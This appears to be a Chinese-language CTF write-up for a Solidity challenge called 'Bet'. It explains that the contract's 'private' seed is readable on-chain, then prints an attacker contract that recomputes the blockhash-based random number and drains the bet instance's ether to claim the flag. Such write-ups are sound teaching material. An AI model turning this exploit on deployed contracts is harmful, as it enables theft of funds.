
# Bet 

這題給了一個 `Bet.sol` 

裡面的 BetFactory 內含兩個函式： `create` , `validate`

create() : 負責建立 `Bet` instance
validate() : 裡面有個 emit getFlag 負責發 Flag

另外還有一個 class 叫做 Bet 是這題主要的攻擊目標，裡面有兩個函式： `getRandom`, `bet`

getRandom() 會產生要猜的亂數和下一輪的亂數而 
bet() 會在你猜對的時候把自己的錢送過去

連線過去會看到以下畫面：

```
Factory Contract Address : 0x8e0a809B1f413deB6427535cC53383954DBF8329
1) call create() to generate new challenge instance
2) call validate(...) to get flag
```

這題的目標在 getRandom 產生的亂數，只要猜對他基本上就結束了

```javascript
contract Bet is Challenge {
    uint private seed;

    constructor (address _player, uint _seed) Challenge(_player) {
        seed = _seed;
    }

    ...

    function getRandom () internal returns(uint) {
        uint rand = seed ^ uint(blockhash(block.number - 1));
        seed ^= block.timestamp;
        return rand;
    }
```

我們知道在 Smart contract 裡，private 只是裝飾品，跟 public 是一樣的

所以我們可以偷看當前的 seed 是多少

不過後面的 `uint(blockhash(block.number - 1))` 不好算，所以還是寫個 solidity 來幫我們計算，再把計算結果送過去比較簡單


我們要做的步驟如下：

1. 呼叫 BetFactory 的 create()
2. 計算正確的值給 Bet instance 的 bet()
3. 收走他的錢
4. 呼叫 BetFactory 的 validate(token)

```javascript
contract GuessNumberCaller {
    
    BetFactory betFactory;
    
    function createBet(address factory_address) public payable {
        betFactory = BetFactory(factory_address);
        betFactory.create{value:0.5 ether}();
    }
    
    function callNewNumberChallenge(address instance_address, uint seed) public payable {
        uint result = seed ^ uint(blockhash(block.number - 1));
        Bet bet = Bet(instance_address);
        bet.bet{value:0.1 ether}(result);
    }

    // 這行定義你的 Contract 收到錢要幹嘛。少了這行，你的 Contract 會收不了錢
    fallback () external payable {} 
    
    function validateFlag(uint token) public {
        betFactory.validate(token);
    }
    
}
```

然後照著填參數觸發就好了
